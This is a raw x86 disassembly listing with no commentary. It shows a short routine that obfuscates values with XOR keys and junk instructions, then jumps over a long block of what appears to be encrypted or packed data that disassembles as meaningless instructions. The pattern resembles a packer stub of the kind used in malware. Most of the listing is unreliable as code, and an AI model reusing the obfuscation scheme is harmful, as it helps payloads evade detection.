  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43366f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43362f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	es xchg esi,eax
  407497:	(bad)  
  407498:	shld   eax,eax,0x7e
  40749c:	jle    0x4074be
  40749e:	jge    0x40751e
  4074a0:	jle    0x40743c
  4074a2:	addr16 mov ds:0xf68d,eax
  4074a6:	ins    DWORD PTR es:[edi],dx
  4074a7:	sub    BYTE PTR [ebx-0x27],ah
  4074aa:	lock test BYTE PTR [esi+0x40],bl
  4074ae:	repnz aad 0xd9
  4074b1:	jns    0x4074cd
  4074b3:	inc    eax
  4074b4:	adc    DWORD PTR [esp+eax*1+0x2b],esp
  4074b8:	sub    al,0x26
  4074ba:	push   ss
  4074bb:	push   ds
  4074bc:	test   BYTE PTR [ebp-0x19],ah
  4074bf:	(bad)  
  4074c0:	mov    edi,0x7272ed25
  4074c5:	jmp    0xe9f6:0xf39dabe4
  4074cc:	adc    DWORD PTR [ebx+0xc7e1c3e],edx
  4074d2:	xchg   esi,eax
  4074d3:	inc    DWORD PTR [ecx]
  4074d5:	and    DWORD PTR [esi],edi
  4074d7:	or     al,0x25
  4074d9:	scas   eax,DWORD PTR es:[edi]
  4074da:	add    DWORD PTR [ecx],esi
  4074dc:	mov    bh,BYTE PTR [ebp+edx*2-0x65]
  4074e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074e1:	xor    al,0xda
  4074e3:	pop    eax
  4074e4:	test   al,0x66
  4074e6:	xor    ecx,DWORD PTR [esi+0x6e]
  4074e9:	fsub   st(5),st
  4074eb:	jbe    0x407568
  4074ed:	xchg   edi,eax
  4074ee:	fsubr  st,st(2)
  4074f0:	push   edx
  4074f1:	clc    
  4074f2:	jmp    0x407509
  4074f4:	mov    eax,ds:0x32bd227b
  4074f9:	mov    ah,0xd7
  4074fb:	jbe    0x407515
  4074fd:	inc    ebx
  4074fe:	push   ebx
  4074ff:	pop    esp
  407500:	hlt    
  407501:	inc    ecx
  407502:	cmp    DWORD PTR [esi+ebx*2-0x2dfc1a43],0x4a
  40750a:	lock mov dh,0x87
  40750d:	mov    al,ds:0x1d331a77
  407512:	outs   dx,BYTE PTR ds:[esi]
  407513:	lds    edi,FWORD PTR [ebp-0xd4aa960]
  407519:	and    bh,BYTE PTR [ecx+0x4abb6b8b]
  40751f:	dec    ebx
  407520:	fs in  eax,0x32
  407523:	xchg   edi,eax
  407524:	dec    ebp
  407525:	dec    esi
  407526:	jl     0x4074c0
  407528:	daa    
  407529:	pusha  
  40752a:	push   0x2b
  40752c:	call   0x5aa4dba2
  407531:	push   ecx
  407532:	and    DWORD PTR [esi+0x51],ebx
  407535:	jmp    0x3e7a:0xfb6a2614
  40753c:	retf   
  40753d:	push   ebp
  40753e:	mov    dl,0x13
  407540:	sar    dh,1
  407542:	cmp    DWORD PTR [eax+0x2d],esi
  407545:	in     eax,dx
  407546:	jl     0x407550
  407548:	mov    eax,0x1c4b9118
  40754d:	pop    eax
  40754e:	inc    ecx
  40754f:	pop    edi
  407550:	xor    eax,0xe5b120a0
  407555:	dec    esi
  407556:	dec    ecx
  407557:	loop   0x40758b
  407559:	mov    edx,0xe39fa2cd
  40755e:	push   ebx
  40755f:	(bad)  
  407562:	jl     0x4075b9
  407564:	push   edi
  407565:	dec    ebp
  407566:	mov    ds:0x51bc3525,al
  40756b:	push   eax
  40756c:	ret    0x640a
  40756f:	ja     0x407561
  407571:	push   0xc11236ec
  407576:	loope  0x4075aa
  407578:	cmp    eax,0xef9cddeb
  40757d:	hlt    
  40757e:	adc    eax,0xad64a0e7
  407583:	ja     0x4075c0
  407585:	inc    ebp
  407586:	push   eax
  407587:	sub    al,BYTE PTR [edx-0x47]
  40758a:	aaa    
  40758b:	int    0xdf
  40758d:	mov    bh,0xb
  40758f:	pop    ebp
  407590:	imul   eax,DWORD PTR [edx+eax*8+0x780b737a],0x8127e5d2
  40759b:	fs daa 
  40759d:	or     bl,cl
  40759f:	cld    
  4075a0:	mov    BYTE PTR [edx-0x6b],0xe3
  4075a4:	rcr    bh,0xfc
  4075a7:	arpl   WORD PTR [edx+eax*1+0x75],bx
  4075ab:	mov    dl,0x2c
  4075ad:	ds mov bl,0xc9
  4075b0:	mov    cl,0x2
  4075b2:	scas   eax,DWORD PTR es:[edi]
  4075b3:	jecxz  0x4075bd
  4075b5:	mov    al,ds:0x4a6fd2ad
  4075ba:	fisub  DWORD PTR [eax+0x68d749d6]
  4075c0:	push   gs
  4075c2:	sub    BYTE PTR [ecx],ch
  4075c4:	pop    ebp
  4075c5:	dec    ecx
  4075c6:	push   0xffffffe1
  4075c8:	push   esp
  4075c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075ca:	test   DWORD PTR [esi-0x60],0xab1772dd
  4075d1:	pop    eax
  4075d2:	dec    ecx
  4075d3:	xchg   esi,eax
  4075d4:	push   0x11
  4075d6:	jl     0x4075e6
  4075d8:	sbb    cl,BYTE PTR ds:0x48fdc8a
  4075de:	sbb    DWORD PTR [edx-0x4f],0x79
  4075e2:	push   es
  4075e3:	mov    DWORD PTR [ebx-0x7ab86fb9],eax
  4075e9:	mov    bl,0xf4
  4075eb:	mov    gs,WORD PTR [eax-0x52]
  4075ee:	sbb    ah,ch
  4075f0:	loop   0x407627
  4075f2:	in     eax,0x6c
  4075f4:	sahf   
  4075f5:	stos   BYTE PTR es:[edi],al
  4075f6:	or     al,0x36
  4075f8:	out    dx,eax
  4075f9:	push   edi
  4075fa:	adc    BYTE PTR [eax],cl
  4075fc:	ror    DWORD PTR [ebx-0x3d],cl
  4075ff:	stc    
  407600:	mov    ebp,0x71879ab9
  407605:	adc    DWORD PTR [esp+ebx*4-0x7c],ebp
  407609:	inc    esp
  40760a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40760b:	mov    al,BYTE PTR [eax-0x5e4b78c7]
  407611:	test   eax,0x61f5765f
  407616:	in     al,dx
  407617:	inc    eax
  407618:	bnd ret 
  40761a:	mov    edi,DWORD PTR [edi-0x34]
  40761d:	imul   eax,DWORD PTR [ecx+0x40],0xb38eb5c
  407624:	sbb    edi,esi
  407626:	std    
  407627:	lahf   
  407628:	sub    eax,0x143720e0
  40762d:	push   eax
  40762e:	fimul  WORD PTR [edi-0x3c]
  407631:	jmp    0x407679
  407633:	lahf   
  407634:	repz mov ebp,0x35c9b69
  40763a:	adc    eax,0xf18c08ed
  40763f:	fsub   st,st(3)
  407641:	pushf  
  407642:	push   edi
  407643:	sbb    DWORD PTR [edi+0x61da35d2],esp
  407649:	dec    ebx
  40764a:	in     al,0xa6
  40764c:	fimul  DWORD PTR [ebx-0x6]
  40764f:	inc    ebp
  407650:	stos   BYTE PTR es:[edi],al
  407651:	jg     0x4076a9
  407653:	or     eax,0x376c36b3
  407658:	fild   WORD PTR [esi-0x34]
  40765b:	mov    WORD PTR [eax+0x7dfc81e5],ss
  407661:	ins    BYTE PTR es:[edi],dx
  407662:	mov    eax,0xdd1a2312
  407667:	fidiv  DWORD PTR [ebp+0x49]
  40766a:	aas    
  40766b:	dec    ah
  40766d:	icebp  
  40766e:	cmp    edx,edx
  407670:	cmp    al,0x2b
  407672:	cwde   
  407673:	clts   
  407675:	push   ss
  407676:	std    
  407677:	xor    dl,bl
  407679:	xor    DWORD PTR [edx+0xf],0x6c
  40767d:	mov    ebp,0xd7d99a1a
  407682:	leave  
  407683:	aam    0x37
  407685:	sbb    al,cl
  407687:	jae    0x4076ba
  407689:	leave  
  40768a:	call   0x8f3ce14e
  40768f:	shl    DWORD PTR [edx-0x35],cl
  407692:	jg     0x40764f
  407694:	adc    ecx,eax
  407696:	mov    eax,0xc5b7adf0
  40769b:	call   0xfbc75ec5
  4076a0:	xlat   BYTE PTR ds:[ebx]
  4076a1:	lods   eax,DWORD PTR ds:[esi]
  4076a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076a3:	mov    ds:0xa5fcdcd0,al
  4076a8:	jbe    0x407670
  4076aa:	lock fadd st(1),st
  4076ad:	jo     0x4076fb
  4076af:	jne    0x4076c3
  4076b1:	adc    eax,0x17b7803
  4076b6:	std    
  4076b7:	mov    esp,0x2e53fa07
  4076bc:	mov    ds:0x52f23ee1,al
  4076c1:	pop    ds
  4076c2:	push   ss
  4076c3:	push   edi
  4076c4:	mov    DWORD PTR [edx-0xe],edx
  4076c7:	pop    edx
  4076c8:	push   esi
  4076c9:	push   cs
  4076ca:	fcom   DWORD PTR [esi-0x72]
  4076cd:	mov    BYTE PTR [edx+0x6],dh
  4076d0:	mov    gs,WORD PTR [edi]
  4076d2:	pop    es
  4076d3:	arpl   ax,ax
  4076d5:	inc    edx
  4076d6:	sbb    DWORD PTR [ebp-0x5f],0xd58b4c61
  4076dd:	dec    eax
  4076de:	adc    eax,0x65a82564
  4076e3:	and    eax,0xc6d83ba
  4076e8:	mov    ds:0x6ba2a8ae,al
  4076ed:	(bad)  
  4076ee:	sti    
  4076ef:	jo     0x407735
  4076f1:	nop
  4076f2:	or     eax,0x2cecccc0
  4076f7:	pushf  
  4076f8:	loop   0x407776
  4076fa:	inc    ecx
  4076fb:	aam    0xdb
  4076fd:	arpl   bx,bp
  4076ff:	sbb    eax,0x639d2669
  407704:	shl    ebx,1
  407706:	scas   eax,DWORD PTR es:[edi]
  407707:	push   0xffffff8a
  407709:	cdq    
  40770a:	(bad)  
  40770b:	dec    ebp
  40770c:	push   ss
  40770d:	jmp    0x2a48b7e5
  407712:	es (bad) 
  407714:	cld    
  407715:	lahf   
  407716:	out    dx,al
  407717:	mov    ds:0x9f6c845d,eax
  40771c:	ss mov ebp,0x48cee70e
  407722:	jmp    0xe1b07739
  407727:	mov    al,ds:0xefc9b1ab
  40772c:	repz jbe 0x4076f9
  40772f:	mov    fs,WORD PTR [edi]
  407731:	dec    edi
  407732:	dec    eax
  407733:	ret    0x4e5e
  407736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407737:	je     0x4076d5
  407739:	xor    eax,0x54c0bd90
  40773e:	ins    BYTE PTR es:[edi],dx
  40773f:	xor    cl,bh
  407741:	js     0x407784
  407743:	or     dh,BYTE PTR [edx]
  407745:	scas   al,BYTE PTR es:[edi]
  407746:	jg     0x4077c6
  407748:	mov    BYTE PTR [ecx-0x48],bl
  40774b:	shl    BYTE PTR [edi],1
  40774d:	iret   
  40774e:	push   esi
  40774f:	inc    edx
  407750:	xchg   esi,eax
  407751:	push   ebp
  407752:	and    eax,0x88e90e8f
  407757:	cmp    BYTE PTR [ebx],cl
  407759:	mov    esp,DWORD PTR [ebp-0x6c9f1363]
  40775f:	jnp    0x40775c
  407761:	add    ecx,edx
  407763:	dec    ebx
  407764:	rol    DWORD PTR [eax-0x10792be8],1
  40776a:	pusha  
  40776b:	pop    eax
  40776c:	add    BYTE PTR [edx-0x52799686],bh
  407772:	inc    esp
  407773:	sti    
  407774:	mov    ?,WORD PTR [ecx-0x32]
  407777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407778:	pop    es
  407779:	add    BYTE PTR [ebx-0x2f4ad30e],0xac
  407780:	xor    al,0x18
  407782:	je     0x4077cd
  407784:	sbb    esi,esp
  407786:	cmp    DWORD PTR [ecx+0x5ee516e7],esi
  40778c:	mov    bl,0x42
  40778e:	push   ecx
  40778f:	stos   BYTE PTR es:[edi],al
  407790:	mov    edi,0x4100484c
  407795:	dec    eax
  407796:	and    esp,edx
  407798:	xor    DWORD PTR [esi+0x27],ebp
  40779b:	xchg   ebx,eax
  40779c:	lds    ebx,FWORD PTR ss:[edi]
  40779f:	xchg   ebp,eax
  4077a0:	ja     0x407770
  4077a2:	xchg   BYTE PTR [ecx-0x4456b77],bl
  4077a8:	sub    DWORD PTR [edx-0x1],esi
  4077ab:	pop    esp
  4077ac:	add    ebx,DWORD PTR [ebp-0x50083023]
  4077b2:	mov    eax,ds:0x2507812
  4077b7:	sti    
  4077b8:	lods   eax,DWORD PTR cs:[esi]
  4077ba:	or     al,0x66
  4077bc:	mov    ecx,0xbd04b24c
  4077c1:	mov    DWORD PTR [edx+0x69],esp
  4077c4:	int3   
  4077c5:	cli    
  4077c6:	sub    ebp,esi
  4077c8:	add    al,0x3e
  4077ca:	dec    ecx
  4077cb:	loopne 0x407758
  4077cd:	cmp    edi,DWORD PTR [ebx+ecx*4+0x4d]
  4077d1:	cld    
  4077d2:	mov    DWORD PTR ds:0x4336a7,0x5e65
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	sbb    edi,esi
  4077f6:	in     eax,dx
  4077f7:	dec    esi
  4077f8:	push   esi
  4077f9:	iret   
  4077fa:	jle    0x40787a
  4077fc:	and    BYTE PTR [ebp+0x7e],bh
  4077ff:	jle    0x4077c6
  407801:	push   edx
  407802:	jmp    0x4379:0xd3808b0a
  407809:	adc    DWORD PTR [esi+0x7fbed1c],ebp
  40780f:	imul   ebx,DWORD PTR [esi+0x30],0x44cfcaf4
  407816:	jo     0x407879
  407818:	dec    edx
  407819:	retf   0x2382
  40781c:	(bad)  
  40781d:	mov    ds:0xd4e0c90d,eax
  407822:	push   es
  407823:	dec    ebx
  407824:	sub    DWORD PTR [ecx-0x1be4d53c],ebp
  40782a:	xor    al,0xa7
  40782c:	xchg   DWORD PTR [ebx-0x23],ecx
  40782f:	mov    ecx,0xb07d2251
  407834:	rol    ah,0x41
  407837:	repnz pop ebx
  407839:	jae    0x407896
  40783b:	ja     0x4077c0
  40783d:	sbb    BYTE PTR [edi],0x3e
  407840:	jne    0x4077cb
  407842:	call   FWORD PTR [ecx-0x11]
  407845:	xor    esi,esi
  407847:	pop    edx
  407848:	test   eax,0x7afdac38
  40784d:	imul   ecx,DWORD PTR [eax+ecx*4-0x41],0x721495f0
  407855:	sbb    DWORD PTR [esi+ebx*4-0x3e],edx
  407859:	sub    DWORD PTR [eax],edx
  40785b:	push   0x3a
  40785d:	outs   dx,DWORD PTR ds:[esi]
  40785e:	ror    DWORD PTR [ecx],0xb3
  407861:	adc    BYTE PTR [ebx+0x48],0x45
  407865:	sbb    eax,0xcd0b0bdc
  40786a:	es mov edi,0x1cec4897
  407870:	fwait
  407871:	mov    ds:0x345e193e,eax
  407876:	mov    ecx,0xfb973e05
  40787b:	(bad)
  40787e:	jmp    0x537c:0x84d2c104
  407885:	cmp    eax,DWORD PTR [eax]
  407887:	cmp    DWORD PTR [eax-0x49e2da73],esp
  40788d:	pop    ecx
  40788e:	test   al,0x34
  407890:	mul    dl
  407892:	mov    edx,0x9828a4f4
  407897:	jbe    0x4078ce
  407899:	lock jecxz 0x407884
  40789c:	out    0x84,al
  40789e:	test   al,0x78
  4078a0:	mov    eax,0x638a927
  4078a5:	(bad)  
  4078a6:	je     0x4078cf
  4078a8:	xchg   edi,eax
  4078a9:	mov    ebp,0xaefd1134
  4078ae:	xchg   esp,eax
  4078af:	imul   eax,DWORD PTR [ebx+0x4c2694f8],0x808a8e13
  4078b9:	jle    0x4078f3
  4078bb:	imul   eax,DWORD PTR [edx-0x73],0x77
  4078bf:	sbb    al,ah
  4078c1:	and    eax,0x77709fdc
  4078c6:	test   BYTE PTR [ebp+0x6f],dl
  4078c9:	in     al,0xee
  4078cb:	mov    fs,edi
  4078cd:	es loop 0x407887
  4078d0:	icebp  
  4078d1:	xchg   BYTE PTR [edi-0x51076186],cl
  4078d7:	std    
  4078d8:	icebp  
  4078d9:	lahf   
  4078da:	iret   
  4078db:	hlt    
  4078dc:	inc    esp
  4078dd:	sbb    DWORD PTR [ebx+0x58c8b821],0xf8821661
  4078e7:	push   es
  4078e8:	xor    BYTE PTR [eax],dl
  4078ea:	push   esp
  4078eb:	hlt    
  4078ec:	push   edx
  4078ed:	push   edi
  4078ee:	les    eax,FWORD PTR [edx]
  4078f0:	mov    ebp,0x7c662b4d
  4078f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078f6:	cmp    al,0xfc
  4078f8:	mov    ch,0x9a
  4078fa:	in     eax,dx
  4078fb:	mov    eax,0x1eabfa7b
  407900:	lods   eax,DWORD PTR ds:[esi]
  407901:	outs   dx,DWORD PTR ds:[esi]
  407902:	aam    0x9
  407904:	adc    ah,BYTE PTR [ebx+0x1304859]
  40790a:	xlat   BYTE PTR ds:[ebx]
  40790b:	bound  esp,QWORD PTR [edx-0x7adf40a0]
  407911:	pop    esi
  407912:	arpl   WORD PTR [ecx],si
  407914:	sbb    eax,0x96e6e2f
  407919:	shl    BYTE PTR [edx],1
  40791b:	mov    esp,DWORD PTR [edx-0x1eeec580]
  407921:	sti    
  407922:	add    BYTE PTR [edi+0x2e3a7493],bh
  407928:	sbb    dl,bl
  40792a:	lods   eax,DWORD PTR ds:[esi]
  40792b:	jbe    0x4078cb
  40792d:	int3   
  40792e:	mov    ds:0xf686e2,eax
  407933:	add    esi,DWORD PTR [ebx]
  407935:	outs   dx,BYTE PTR ds:[esi]
  407936:	ins    BYTE PTR es:[edi],dx
  407937:	cdq    
  407938:	lods   eax,DWORD PTR fs:[esi]
  40793a:	ins    DWORD PTR es:[edi],dx
  40793b:	jle    0x4079ab
  40793d:	out    0xfd,eax
  40793f:	sbb    ebx,DWORD PTR ds:0xf4aa2d86
  407945:	push   cs
  407946:	fsubr  st,st(6)
  407948:	aad    0xf2
  40794a:	out    dx,al
  40794b:	aam    0xa7
  40794d:	mov    ebx,0xec9aa5b4
  407952:	and    ch,cl
  407954:	sub    edi,ebp
  407956:	add    DWORD PTR [ecx+edi*2+0x7f773894],ebp
  40795d:	test   eax,0x6f628c73
  407962:	pop    edi
  407963:	mov    bh,0xf4
  407965:	mov    WORD PTR [eax],ds
  407967:	stos   DWORD PTR es:[edi],eax
  407968:	and    bh,BYTE PTR [edi]
  40796a:	addr16 retf 
  40796c:	je     0x4079dd
  40796e:	jo     0x4079c4
  407970:	pop    ss
  407971:	test   edi,ebp
  407973:	test   DWORD PTR [edi],esp
  407975:	mov    ebp,ebp
  407977:	jnp    0x40796c
  407979:	icebp  
  40797a:	inc    ebp
  40797b:	gs out dx,eax
  40797d:	push   es
  40797e:	sbb    ch,bh
  407980:	sub    ebp,DWORD PTR [ebp-0x47bcbb3c]
  407986:	push   esp
  407987:	pop    edi
  407988:	fld    TBYTE PTR [ebx]
  40798a:	int    0xf8
  40798c:	jnp    0x407988
  40798e:	popf   
  40798f:	pusha  
  407990:	inc    ecx
  407991:	xchg   ebx,eax
  407992:	cmp    edi,DWORD PTR [edi+0xd]
  407995:	imul   ebp,DWORD PTR [ecx+0x473b515c],0xfffffffd
  40799c:	aam    0xf4
  40799e:	clc    
  40799f:	xor    al,BYTE PTR ds:0x6110ab3e
  4079a5:	jp     0x407970
  4079a7:	cmc    
  4079a8:	ins    BYTE PTR es:[edi],dx
  4079a9:	icebp  
  4079aa:	mov    al,ds:0xd51af5ce
  4079af:	mov    bl,0x79
  4079b1:	xchg   esi,eax
  4079b2:	aam    0xc6
  4079b4:	cmc    
  4079b5:	addr16 aaa 
  4079b7:	xchg   edx,eax
  4079b8:	ins    DWORD PTR es:[edi],dx
  4079b9:	xor    bh,dl
  4079bb:	cmp    eax,0xd8aff146
  4079c0:	and    bh,BYTE PTR [ecx]
  4079c2:	mov    al,0x5b
  4079c4:	out    0x9d,al
  4079c6:	rcr    ebx,1
  4079c8:	aaa    
  4079c9:	test   DWORD PTR [ebx-0x7a14352e],esi
  4079cf:	mov    al,0x5d
  4079d1:	or     al,0xb
  4079d3:	xor    ch,BYTE PTR [ebx+0x72]
  4079d6:	icebp  
  4079d7:	lea    edi,[eax+0x4d]
  4079da:	jne    0x4079b7
  4079dc:	js     0x407a08
  4079de:	cmp    BYTE PTR [ebp+0x16],bh
  4079e1:	add    BYTE PTR [edx],bl
  4079e3:	pop    es
  4079e4:	scas   al,BYTE PTR es:[edi]
  4079e5:	jle    0x4079aa
  4079e7:	push   es
  4079e8:	dec    esi
  4079e9:	adc    BYTE PTR [edi+0x75305f5f],ah
  4079ef:	paddsb mm5,QWORD PTR [esi+0x2e]
  4079f3:	das    
  4079f4:	adc    esp,DWORD PTR [edi+0x65]
  4079f7:	push   eax
  4079f8:	int    0x7e
  4079fa:	cmp    BYTE PTR [ebp+eax*2-0x1e628cb7],dh
  407a01:	clc    
  407a02:	aam    0xcb
  407a04:	mov    ?,WORD PTR [eax-0x618f1537]
  407a0a:	push   eax
  407a0b:	repz mov dh,0x3
  407a0e:	xchg   ebp,eax
  407a0f:	jne    0x407a02
  407a11:	push   esp
  407a12:	scas   al,BYTE PTR es:[edi]
  407a13:	mov    esp,0xe393db2d
  407a18:	xchg   ebx,eax
  407a19:	add    al,0xc9
  407a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a1c:	call   0x2b0ea16f
  407a21:	push   es
  407a22:	mov    dl,0x9d
  407a24:	mov    ebp,0xd06c8076
  407a29:	repnz inc esp
  407a2c:	dec    ebx
  407a2d:	mov    esp,0xdceeb5c6
  407a32:	dec    ebx
  407a33:	imul   ecx,DWORD PTR [edx-0x7a949189],0x7ccb8d92
  407a3d:	dec    edx
  407a3e:	(bad)  
  407a3f:	jmp    0x4079f2
  407a41:	jecxz  0x407a54
  407a43:	(bad)  
  407a44:	push   edi
  407a45:	stos   BYTE PTR es:[edi],al
  407a46:	into   
  407a47:	inc    ecx
  407a48:	ret    0x35fc
  407a4b:	jp     0x407a6d
  407a4d:	test   ecx,0xa87937fe
  407a53:	out    0xb,eax
  407a55:	adc    BYTE PTR [edi+edx*2+0x3b0fdcc5],ch
  407a5c:	rcl    ah,0x36
  407a5f:	(bad)  
  407a60:	test   al,0xcc
  407a63:	sbb    al,0xa
  407a65:	and    eax,0x7625c0d
  407a6a:	cmc    
  407a6b:	mov    cl,0xb5
  407a6d:	xor    BYTE PTR [esp+edi*1+0x76],0xe7
  407a72:	xchg   esi,eax
  407a73:	sub    edx,DWORD PTR [ecx]
  407a75:	es std 
  407a77:	ja     0x407a29
  407a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a7a:	loopne 0x407a23
  407a7c:	fisubr DWORD PTR [esi+edi*2+0x58]
  407a80:	int    0x8
  407a82:	scas   eax,DWORD PTR es:[edi]
  407a83:	pop    esi
  407a84:	xchg   edx,eax
  407a85:	xor    edx,DWORD PTR ds:0x5687f758
  407a8b:	jo     0x407afb
  407a8d:	dec    ecx
  407a8e:	inc    ebp
  407a8f:	push   0xb02e853e
  407a94:	jg     0x407a6f
  407a96:	out    dx,eax
  407a97:	xor    dl,BYTE PTR [eax-0x1c46f431]
  407a9d:	jb     0x407ae4
  407a9f:	mov    eax,0xf3a8d1a8
  407aa4:	lods   al,BYTE PTR ds:[esi]
  407aa5:	cld    
  407aa6:	cmp    bl,bh
  407aa8:	pop    ebp
  407aa9:	and    esp,DWORD PTR [edi-0x43]
  407aac:	leave  
  407aad:	je     0x407ad7
  407aaf:	sbb    dl,BYTE PTR [esi]
  407ab1:	mov    ebp,0x4538daf9
  407ab6:	mov    dh,dh
  407ab8:	add    dl,bl
  407aba:	out    0xfa,eax
  407abc:	cmp    ch,BYTE PTR ds:0xb8caa66a
  407ac2:	xchg   esi,eax
  407ac3:	pop    es
  407ac4:	push   ds
  407ac5:	mov    edx,0xa8b0d2b0
  407aca:	xchg   edx,eax
  407acb:	dec    ecx
  407acc:	xchg   edx,eax
  407acd:	loope  0x407af2
  407acf:	pop    ss
  407ad0:	repz mov ds:0xf2eab302,al
  407ad6:	or     BYTE PTR [ebp-0x64bd35d1],dl
  407adc:	sub    eax,0x226af4ad
  407ae1:	adc    eax,0x1136c2cf
  407ae6:	das    
  407ae7:	(bad)  
  407ae8:	fdiv   DWORD PTR [edi-0x5a]
  407aeb:	jge    0x407a85
  407aed:	mov    ds:0xdaa7c0fc,al
  407af2:	dec    ebx
  407af3:	pop    ecx
  407af4:	pop    eax
  407af5:	xchg   ecx,eax
  407af6:	mov    edi,0x75425dd7
  407afb:	inc    esi
  407afc:	inc    edx
  407afd:	or     DWORD PTR [esi],0xffffffbf
  407b00:	xor    DWORD PTR [edx-0x6ba69a45],edi
  407b06:	mov    ch,0x5e
  407b08:	fbstp  TBYTE PTR [edx+eax*2+0x17]
